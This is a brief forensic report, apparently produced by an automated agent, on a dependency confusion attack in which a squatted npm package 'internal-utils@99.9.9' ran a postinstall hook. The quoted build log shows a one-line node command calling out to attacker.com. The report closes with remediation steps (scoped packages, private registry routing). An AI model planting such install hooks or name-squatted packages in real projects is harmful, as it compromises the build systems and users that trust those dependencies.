# Forensic Investigation Report: Case #003 - Dependency Confusion

**Date:** 2026-02-05
**Investigator:** DPFF Automated Agent
**Incident Type:** Supply Chain Attack
**Severity:** HIGH

## Executive Summary
The application built environment includes a malicious external package `internal-utils@99.9.9` instead of the legitimate internal private package. This malicious package executed code during installation.

## Evidence Analyzed
1.  **File:** `package_malicious.json` (Dependency manifest)
2.  **Log:** `npm_install_log.txt` (Build logs)

## Findings
### 1. Configuration Vulnerability
The `package.json` file requests `internal-utils: ^99.9.9`.

```json
  "dependencies": {
    "internal-utils": "^99.9.9"
  }
```

### 2. Execution Confirmation
The build log `npm_install_log.txt` confirms the package was pulled and a `postinstall` script ran:

```
> internal-utils@99.9.9 postinstall /app/node_modules/internal-utils
> node -e "require('http').get('http://attacker.com/pwned')"
```

The script contacted `attacker.com`. The warning `No repository field` suggests this package did not originate from a trusted internal source.

## Root Cause
- **Dependency Confusion Name Squatting:** Attacker published a package with the same name as an internal dependency but a higher version number on the public npm registry.
- **Misconfigured Registry:** The build system was configured to check the public registry for internal packages.

## Recommendations
1.  Scope internal packages (e.g., `@myorg/internal-utils`).
2.  Configure `.npmrc` to route internal scopes solely to the private registry.
